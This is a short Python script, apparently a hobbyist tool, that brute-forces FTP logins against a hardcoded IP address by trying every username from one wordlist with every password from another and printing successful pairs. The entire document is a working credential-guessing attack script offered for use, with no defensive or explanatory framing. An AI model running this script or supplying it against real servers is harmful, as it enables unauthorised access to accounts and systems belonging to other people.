#!/usr/bin/python

from ftplib import FTP

target = '11.11.11.171'
verbose = True

print('[*] - BRUTEFORCE FTP Attack')
print()


def bruteforceattack(_target,_user,_pwd):
    try:
        ftpconn = FTP(_target)
        connection = ftpconn.login(_user,_pwd)
        ftpconn.quit()
        print('[+] BINGO - username:', _user, 'Senha:', _pwd) 
        return True

    except:
        if verbose:
            print('[-] FAIL  - username:', _user, 'Senha:', _pwd) 


def userlist_wordlist(_target,_userlist,_wordlist):
    with open(_userlist, 'r') as _worduser:
        for _line in _worduser:
            _user = _line.strip('\n')

            with open(_wordlist, 'r') as _word:
                for _line in _word:
                    _pwd = _line.strip('\n')

                    bingo=bruteforceattack(_target,_user,_pwd)
            
                    if bingo:
                        break

userlist_wordlist(target, 'user.txt', 'word.txt')

